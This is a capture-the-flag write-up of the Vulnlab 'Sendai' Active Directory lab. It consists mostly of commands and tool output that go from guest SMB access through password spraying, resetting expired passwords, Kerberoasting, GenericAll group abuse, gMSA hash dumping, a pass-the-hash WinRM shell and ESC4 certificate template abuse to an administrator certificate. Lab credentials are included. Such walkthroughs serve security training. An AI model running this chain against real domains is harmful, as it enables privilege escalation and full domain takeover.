---
title: Vulnlab - Sendai
date: 2025-01-14 13:00:00 +/-TTTT
categories: [VulnLab]
tags: [smbpasswd, GenericAll, ESC4]     # TAG names should always be lowercase
---

![img-description](/assets/images/sendai_slide.png)

## enum

    ➜  sendai nxc smb 10.10.65.237
    SMB         10.10.65.237    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)

fast look

    ➜  sendai nxc smb DC -u 'guest' -p '' --shares  
    SMB         10.10.65.237    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
    SMB         10.10.65.237    445    DC               [+] sendai.vl\guest: 
    SMB         10.10.65.237    445    DC               [*] Enumerated shares
    SMB         10.10.65.237    445    DC               Share           Permissions     Remark
    SMB         10.10.65.237    445    DC               -----           -----------     ------
    SMB         10.10.65.237    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.65.237    445    DC               C$                              Default share
    SMB         10.10.65.237    445    DC               config                          
    SMB         10.10.65.237    445    DC               IPC$            READ            Remote IPC
    SMB         10.10.65.237    445    DC               NETLOGON                        Logon server share 
    SMB         10.10.65.237    445    DC               sendai          READ            company share
    SMB         10.10.65.237    445    DC               SYSVOL                          Logon server share 
    SMB         10.10.65.237    445    DC               Users           READ  

before spray

    ➜  sendai smbclient \\\\DC\\sendai
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Tue Jul 18 13:31:04 2023
    ..                                DHS        0  Wed Jul 19 10:11:25 2023
    hr                                  D        0  Tue Jul 11 08:58:19 2023
    incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
    it                                  D        0  Tue Jul 18 09:16:46 2023
    legal                               D        0  Tue Jul 11 08:58:23 2023
    security                            D        0  Tue Jul 18 09:17:35 2023
    transfer                            D        0  Tue Jul 11 09:00:20 2023

                    7309822 blocks of size 4096. 606107 blocks available
    smb: \> get incident.txt 
    getting file \incident.txt of size 1372 as incident.txt (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
    smb: \> exit
    ➜  sendai cat incident.txt 
    Dear valued employees,

    We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

    To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

    We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

    If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

    Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.#

### lookupsid

    ➜  sendai impacket-lookupsid guest@DC
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    Password:
    [*] Brute forcing SIDs at DC
    [*] StringBinding ncacn_np:DC[\pipe\lsarpc]
    [*] Domain SID is: S-1-5-21-3085872742-570972823-736764132
    498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
    500: SENDAI\Administrator (SidTypeUser)
    501: SENDAI\Guest (SidTypeUser)
    502: SENDAI\krbtgt (SidTypeUser)
    512: SENDAI\Domain Admins (SidTypeGroup)
    513: SENDAI\Domain Users (SidTypeGroup)
    514: SENDAI\Domain Guests (SidTypeGroup)
    515: SENDAI\Domain Computers (SidTypeGroup)
    516: SENDAI\Domain Controllers (SidTypeGroup)
    517: SENDAI\Cert Publishers (SidTypeAlias)
    518: SENDAI\Schema Admins (SidTypeGroup)
    519: SENDAI\Enterprise Admins (SidTypeGroup)
    520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
    521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
    522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
    525: SENDAI\Protected Users (SidTypeGroup)
    526: SENDAI\Key Admins (SidTypeGroup)
    527: SENDAI\Enterprise Key Admins (SidTypeGroup)
    553: SENDAI\RAS and IAS Servers (SidTypeAlias)
    571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
    572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
    1000: SENDAI\DC$ (SidTypeUser)
    1101: SENDAI\DnsAdmins (SidTypeAlias)
    1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
    1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
    1104: SENDAI\sqlsvc (SidTypeUser)
    1105: SENDAI\websvc (SidTypeUser)
    1107: SENDAI\staff (SidTypeGroup)
    1108: SENDAI\Dorothy.Jones (SidTypeUser)
    1109: SENDAI\Kerry.Robinson (SidTypeUser)
    1110: SENDAI\Naomi.Gardner (SidTypeUser)
    1111: SENDAI\Anthony.Smith (SidTypeUser)
    1112: SENDAI\Susan.Harper (SidTypeUser)
    1113: SENDAI\Stephen.Simpson (SidTypeUser)
    1114: SENDAI\Marie.Gallagher (SidTypeUser)
    1115: SENDAI\Kathleen.Kelly (SidTypeUser)
    1116: SENDAI\Norman.Baxter (SidTypeUser)
    1117: SENDAI\Jason.Brady (SidTypeUser)
    1118: SENDAI\Elliot.Yates (SidTypeUser)
    1119: SENDAI\Malcolm.Smith (SidTypeUser)
    1120: SENDAI\Lisa.Williams (SidTypeUser)
    1121: SENDAI\Ross.Sullivan (SidTypeUser)
    1122: SENDAI\Clifford.Davey (SidTypeUser)
    1123: SENDAI\Declan.Jenkins (SidTypeUser)
    1124: SENDAI\Lawrence.Grant (SidTypeUser)
    1125: SENDAI\Leslie.Johnson (SidTypeUser)
    1126: SENDAI\Megan.Edwards (SidTypeUser)
    1127: SENDAI\Thomas.Powell (SidTypeUser)
    1128: SENDAI\ca-operators (SidTypeGroup)
    1129: SENDAI\admsvc (SidTypeGroup)
    1130: SENDAI\mgtsvc$ (SidTypeUser)
    1131: SENDAI\support (SidTypeGroup)

#### create users list

    ➜  sendai cat look-users.txt | grep -i "SidTypeUser" | awk '{print $2}' | cut -d '\' -f2
    Administrator
    Guest
    krbtgt
    DC$
    sqlsvc
    websvc
    Dorothy.Jones
    Kerry.Robinson
    Naomi.Gardner
    Anthony.Smith
    Susan.Harper
    Stephen.Simpson
    Marie.Gallagher
    Kathleen.Kelly
    Norman.Baxter
    Jason.Brady
    Elliot.Yates
    Malcolm.Smith
    Lisa.Williams
    Ross.Sullivan
    Clifford.Davey
    Declan.Jenkins
    Lawrence.Grant
    Leslie.Johnson
    Megan.Edwards
    Thomas.Powell
    mgtsvc$

spray part

    ➜  sendai nxc smb DC -u users.txt -p '' --no-bruteforce --continue-on-success

    SMB         10.10.65.237    445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE

    SMB         10.10.65.237    445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE

Same what we did at Baby

## smbpasswd

    ➜  sendai python3 smbpasswd.py  'Elliot.Yates:@sendai.vl' -newpass Password123!
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    Current SMB password: 
    [!] Password is expired, trying to bind with a null session.
    [*] Password was changed successfully.
    ➜  sendai nxc smb DC -u Elliot.Yates -p 'Password123!'
    SMB         10.10.65.237    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
    SMB         10.10.65.237    445    DC               [+] sendai.vl\Elliot.Yates:Password123! 

#### shares now 


    ➜  sendai nxc smb DC -u Elliot.Yates -p 'Password123!' --shares
    SMB         10.10.65.237    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
    SMB         10.10.65.237    445    DC               [+] sendai.vl\Elliot.Yates:Password123! 
    SMB         10.10.65.237    445    DC               [*] Enumerated shares
    SMB         10.10.65.237    445    DC               Share           Permissions     Remark
    SMB         10.10.65.237    445    DC               -----           -----------     ------
    SMB         10.10.65.237    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.65.237    445    DC               C$                              Default share
    SMB         10.10.65.237    445    DC               config          READ,WRITE      
    SMB         10.10.65.237    445    DC               IPC$            READ            Remote IPC
    SMB         10.10.65.237    445    DC               NETLOGON        READ            Logon server share 
    SMB         10.10.65.237    445    DC               sendai          READ,WRITE      company share
    SMB         10.10.65.237    445    DC               SYSVOL          RE

#### bloodhound

    ➜  bloodhound bloodhound-python -c ALL -u 'Elliot.Yates' -p 'Password123!' -d sendai.vl -ns 10.10.65.237
    INFO: Found AD domain: sendai.vl
    INFO: Getting TGT for user
    WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.sendai.vl:88)] [Errno -2] Name or service not known
    INFO: Connecting to LDAP server: dc.sendai.vl
    INFO: Found 1 domains
    INFO: Found 1 domains in the forest
    INFO: Found 1 computers
    INFO: Connecting to LDAP server: dc.sendai.vl
    INFO: Found 27 users
    INFO: Found 57 groups
    INFO: Found 2 gpos
    INFO: Found 5 ous
    INFO: Found 19 containers
    INFO: Found 0 trusts
    INFO: Starting computer enumeration with 10 workers
    INFO: Querying computer: dc.sendai.vl
    INFO: Done in 00M 26S

All Kerberoastable Users fastly ;)

![img-description](/assets/images/11.png)

### GetUserSPNs

    ➜  sendai impacket-GetUserSPNs -request -dc-ip DC sendai.vl/Elliot.Yates

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    Password:
    ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
    --------------------  ------  --------  --------------------------  --------------------------  ----------
    MSSQL/dc.sendai.vl    sqlsvc            2023-07-11 05:51:18.413329  2025-01-13 16:47:45.680311             



    [-] CCache file is not found. Skipping...
    $krb5tgs$23$*sqlsvc$SENDAI.VL$sendai.vl/sqlsvc*$de9681aefbd0f6bbd7c4e5cab5c20a8f$5509e7e86324d957519c9b69a5005fca0f5c2245c6d87f7228e573ad416c2f0afe84a33b3.....

but its not crackable.

#### config share

    ➜  sendai smbclient \\\\DC\\config -U Elliot.Yates
    Password for [WORKGROUP\Elliot.Yates]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Mon Jan 13 17:09:35 2025
    ..                                DHS        0  Wed Jul 19 10:11:25 2023
    .sqlconfig                          A       78  Tue Jul 11 08:57:11 2023

                    7309822 blocks of size 4096. 846745 blocks available
    smb: \> get .sqlconfig 
    getting file \.sqlconfig of size 78 as .sqlconfig (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
look at this file
    ➜  sendai cat .sqlconfig
    Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;#

    ➜  sendai nxc smb DC -u sqlsvc -p 'SurenessBlob85' --shares
    SMB         10.10.65.237    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
    SMB         10.10.65.237    445    DC               [+] sendai.vl\sqlsvc:SurenessBl<redacted>

![img-description](/assets/images/23.png)

so lets add urself at ADMSVC its because

![img-description](/assets/images/31.png)

we have  ReadGMSAPassword

## GenericAll (add user group)

    (myenv) ➜  bloodyAD bloodyAD -d sendai.vl --host 10.10.65.237 -u Elliot.Yates -p Password123! add groupMember ADMSVC Elliot.Yates
    [+] Elliot.Yates added to ADMSVC

### GMSAdumper

    ➜  gMSADumper git:(main) python3 gMSADumper.py -u 'Elliot.Yates' -p 'Password123!' -d sendai.vl
    Users or groups who can read password for mgtsvc$:
    > admsvc
    mgtsvc$:::ce0b2ff6ebd759c1b0<redacted>
    mgtsvc$:aes256-cts-hmac-sha1-96:31aadec6c9cae2c03f9854ebd5b2d30c977ef3cc581c7916ef4e117dbdee820f
    mgtsvc$:aes128-cts-hmac-sha1-96:9e8e656f855314bf46064861f59a8c0d

mgtsvc$

    ➜  sendai nxc winrm DC -u mgtsvc$ -H ce0b2ff6ebd759<redacted>
    WINRM       10.10.65.237    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
    WINRM       10.10.65.237    5985   DC               [+] sendai.vl\mgtsvc$:ce0b2ff6ebd7<redacted> (Pwn3d!)

#### winrm shell 

    ➜  sendai evil-winrm -i DC -u mgtsvc$ -H ce0b2ff6ebd759c<redacted>
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\mgtsvc$\Documents> 

there is ca-operators groups so for ADCS attack i chceked which user we need.

![img-description](/assets/images/41.png)

We have no idea about Clifford so lets try to get him password

https://github.com/itm4n/PrivescCheck

### privesc.ps1

    *Evil-WinRM* PS C:\Users\mgtsvc$\Documents> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"

and download .html file and look at here;

![img-description](/assets/images/51.png)

    we got creds

    C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs
    User        : LocalSystem
    StartMode   : Automatic

### certipy part
    ➜  certipy certipy-ad find -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.10.65.237 -vulnerable -enabled
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Finding certificate templates
    [*] Found 34 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 12 enabled certificate templates
    [*] Trying to get CA configuration for 'sendai-DC-CA' via CSRA
    [!] Got error while trying to get CA configuration for 'sendai-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
    [*] Trying to get CA configuration for 'sendai-DC-CA' via RRP
    [!] Failed to connect to remote registry. Service should be starting now. Trying again...
    [*] Got CA configuration for 'sendai-DC-CA'
    [*] Saved BloodHound data to '20250113174809_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
    [*] Saved text output to '20250113174809_Certipy.txt'
    [*] Saved JSON output to '20250113174809_Certipy.json'

### ESC4

before start 

    {
    "Certificate Authorities": {
        "0": {
        "CA Name": "sendai-DC-CA",
    "Certificate Templates": {
        "0": {
        "Template Name": "SendaiComputer",
        "Display Name": "SendaiComputer",
        "Certificate Authorities": [
            "sendai-DC-CA"
        },
        "[!] Vulnerabilities": {
            "ESC4": "'SENDAI.VL\\\\ca-operators' has dangerous permissions"
      
https://github.com/lineeralgebra/autoADCS

    ➜  autoADCS git:(main) python3 autoadcs.py 
    === ADCS Attack Command Generator ===
    Choose an attack vector:
    1. ESC1
    3. ESC3
    4. ESC4
    6. ESC6
    7. ESC7
    8. ESC8
    9. ESC9
    11. ESC11
    13. ESC13
    Enter your choice (1 or 3 or 4 or 7 or 8 or 9 or 11 or 13): 4
    Enter username: clifford.davey
    Enter domain: sendai.vl
    Enter password: RFmoB2WplgE_3p
    Enter template: SendaiComputer
    Enter ca: sendai-DC-CA
    Enter upn: administrator@sendai.vl

    Generated Commands:
    certipy-ad template -username clifford.davey@sendai.vl -password RFmoB2WplgE_3p -template SendaiComputer -save-old

    certipy-ad req -username clifford.davey@sendai.vl -password RFmoB2WplgE_3p -ca sendai-DC-CA -target sendai.vl -template SendaiComputer -upn administrator@sendai.vl

#### commands

    ➜  sendai certipy-ad template -username clifford.davey@sendai.vl -password RFmoB2WplgE_3p -template SendaiComputer -save-old
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Saved old configuration for 'SendaiComputer' to 'SendaiComputer.json'
    [*] Updating certificate template 'SendaiComputer'
    [*] Successfully updated 'SendaiComputer'

get administrator.pfx

    ➜  sendai certipy-ad req -username clifford.davey@sendai.vl -password RFmoB2WplgE_3p -ca sendai-DC-CA -target sendai.vl -template SendaiComputer -upn administrator@sendai.vl

    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 5
    [*] Got certificate with UPN 'administrator@sendai.vl'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator.pfx'

